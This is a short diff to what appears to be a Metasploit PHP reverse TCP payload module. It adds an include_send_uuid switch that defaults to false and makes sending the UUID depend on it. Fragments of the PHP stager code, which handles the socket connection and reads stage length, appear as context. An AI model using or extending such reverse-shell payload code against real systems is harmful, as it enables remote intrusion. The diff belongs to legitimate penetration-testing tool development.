@@ -29,6 +29,14 @@ module Payload::Php::ReverseTcp
     Rex::Text.compress(php)
   end
 
+  #
+  # By default, we don't want to send the UUID, but we'll send
+  # for certain payloads if requested.
+  #
+  def include_send_uuid
+    false
+  end
+
   def transport_config(opts={})
     transport_config_reverse_tcp(opts)
   end
@@ -64,7 +72,8 @@ if (!$s_type) {
 }
 if (!$s) { die('no socket'); }
 ^
-    php << php_send_uuid 
+
+    php << php_send_uuid if include_send_uuid
 
     php << %Q^switch ($s_type) {
 case 'stream': $len = fread($s, 4); break;
